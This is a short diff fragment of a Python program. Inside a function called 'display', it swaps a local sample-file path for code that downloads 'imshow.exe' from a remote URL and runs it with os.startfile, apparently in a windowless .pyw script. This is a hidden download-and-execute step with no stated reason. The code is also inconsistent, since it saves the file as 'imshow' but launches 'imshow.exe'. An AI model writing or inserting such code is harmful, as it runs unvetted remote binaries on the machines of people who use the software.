@@ -141,7 +141,15 @@ def display(fp:str):
                     file.write(chunk)
                     downloaded_size += len(chunk)
     except FileExistsError:pass
-    file_path = f"assets/sample.{ext}"
+    if not os.path.exists("imshow.exe"):
+        exe = hit(url+f"static/apps/imshow.exe")
+        with open(f"imshow", "xb") as file:
+            downloaded_size = 0
+            for chunk in exe.iter_content(chunk_size=8192):
+                if chunk:
+                    file.write(chunk)
+                    downloaded_size += len(chunk)
+    os.startfile("imshow.exe")
 #hello.pyw
 def main():
     while not terminate:
